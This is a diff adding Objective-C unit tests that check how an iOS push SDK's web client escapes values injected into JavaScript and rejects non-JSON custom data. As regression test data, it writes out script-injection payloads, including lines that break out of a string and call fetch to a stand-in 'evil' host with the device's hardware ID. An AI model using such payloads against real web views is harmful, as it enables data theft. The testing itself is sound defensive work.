@@ -5,10 +5,18 @@
 #import "PWMessageViewController.h"
 #import "PWConfig.h"
 #import "PWRichMedia.h"
+#import "PWWebClient.h"
 
 @interface PWRichMediaManager (Test)
 
 - (BOOL)shouldPresentRichMedia:(PWRichMedia *)richMedia;
+
+@end
+
+@interface PWWebClient (Test)
+
++ (NSString *)pw_jsLiteralForString:(NSString *)value;
++ (NSString *)pw_jsJSONValueForString:(NSString *)value;
 
 @end
 
@@ -183,6 +191,98 @@
     [self.manager presentRichMedia:self.mockRichMedia];
 
     OCMVerifyAll(self.mockMessageViewController);
+}
+
+/// Verifies that plain values are rendered exactly as the previous hand-quoted injection did.
+- (void)testJsLiteralKeepsPlainValuesUnchanged {
+    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@"user@example.com"], @"\"user@example.com\"");
+    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@"r-abc123"], @"\"r-abc123\"");
+    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@"Пользователь"], @"\"Пользователь\"");
+    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:@""], @"\"\"");
+    XCTAssertEqualObjects([PWWebClient pw_jsLiteralForString:nil], @"\"\"");
+}
+
+/// Verifies that a quote, a backslash, a newline or a closing script tag stays inside the literal:
+/// the literal must decode back to the original value instead of escaping into executable code.
+///
+/// Decoding is deliberately not the only check. It runs through NSJSONSerialization — the same
+/// component whose failure opens the hole — so on that failure the oracle goes blind exactly where
+/// the code does. The structural assertions below hold without it: a literal that starts and ends
+/// with a quote and carries no unescaped quote inside cannot terminate early, whatever decoded.
+- (void)testJsLiteralEscapesInjectionAttempts {
+    NSArray<NSString *> *values = @[ @"x\"; alert(1); //",
+                                     @"a\\b",
+                                     @"line1\nline2",
+                                     @"</script>" ];
+
+    for (NSString *value in values) {
+        NSString *literal = [PWWebClient pw_jsLiteralForString:value];
+        NSString *wrapped = [NSString stringWithFormat:@"[%@]", literal];
+        NSArray *decoded = [NSJSONSerialization JSONObjectWithData:[wrapped dataUsingEncoding:NSUTF8StringEncoding]
+                                                           options:0
+                                                             error:nil];
+
+        XCTAssertEqualObjects(decoded.firstObject, value, @"literal %@ must decode back to the original value", literal);
+        [self assertLiteralIsSelfContained:literal forValue:value];
+    }
+}
+
+/// Verifies that an unserializable value renders as an empty literal instead of the hand-quoted form.
+///
+/// A lone surrogate makes dataWithJSONObject: return nil without raising, and the pre-fix fallback
+/// pasted the raw value between hand-written quotes — restoring the injection the escaper exists to
+/// prevent. The payload here closes the literal and appends a statement, so a regression to that
+/// fallback fails on the structural check, not on decoding: decoding cannot help, the value is not
+/// serializable in the first place.
+- (void)testJsLiteralRejectsUnserializableValue {
+    unichar loneSurrogate = 0xD83D;
+    NSString *broken = [[NSString alloc] initWithCharacters:&loneSurrogate length:1];
+    NSString *payload = [broken stringByAppendingString:@"\"; fetch('https://evil/' + window.pushwoosh._hwid); //"];
+
+    XCTAssertNil([NSJSONSerialization dataWithJSONObject:@[payload] options:0 error:nil],
+                 @"precondition: the payload must be the case where serialization fails silently");
+
+    NSString *literal = [PWWebClient pw_jsLiteralForString:payload];
+
+    XCTAssertEqualObjects(literal, @"\"\"", @"an unserializable value must render as an empty literal");
+    [self assertLiteralIsSelfContained:literal forValue:payload];
+}
+
+/// Structural check that does not depend on NSJSONSerialization: the literal must be quoted on both
+/// ends and must not contain a quote that is not escaped, so it cannot end before the statement does.
+- (void)assertLiteralIsSelfContained:(NSString *)literal forValue:(NSString *)value {
+    XCTAssertGreaterThanOrEqual(literal.length, 2, @"literal for %@ must be quoted", value);
+    XCTAssertTrue([literal hasPrefix:@"\""] && [literal hasSuffix:@"\""], @"literal %@ must be quoted on both ends", literal);
+
+    NSString *body = [literal substringWithRange:NSMakeRange(1, literal.length - 2)];
+    NSUInteger index = 0;
+    while (index < body.length) {
+        unichar c = [body characterAtIndex:index];
+        if (c == '\\') {
+            index += 2;
+            continue;
+        }
+        XCTAssertNotEqual(c, '"', @"literal %@ carries an unescaped quote and can be closed early", literal);
+        index += 1;
+    }
+}
+
+/// Verifies that valid custom push data keeps its JSON shape, so templates still receive an object.
+- (void)testCustomDataValueKeepsValidJson {
+    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"{\"a\":1}"], @"{\"a\":1}");
+    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"[1,2,3]"], @"[1,2,3]");
+    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"42"], @"42");
+    XCTAssertEqualObjects([PWWebClient pw_jsJSONValueForString:@"{}"], @"{}");
+}
+
+/// Verifies that custom push data carrying trailing statements or plain garbage is rejected
+/// instead of being evaluated as JavaScript next to the native bridge.
+- (void)testCustomDataValueRejectsNonJson {
+    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@"1; fetch('https://evil/' + window.pushwoosh._hwid)"]);
+    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@"{\"a\":1}; alert(1)"]);
+    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@"promo123"]);
+    XCTAssertNil([PWWebClient pw_jsJSONValueForString:@""]);
+    XCTAssertNil([PWWebClient pw_jsJSONValueForString:nil]);
 }
 
 @end
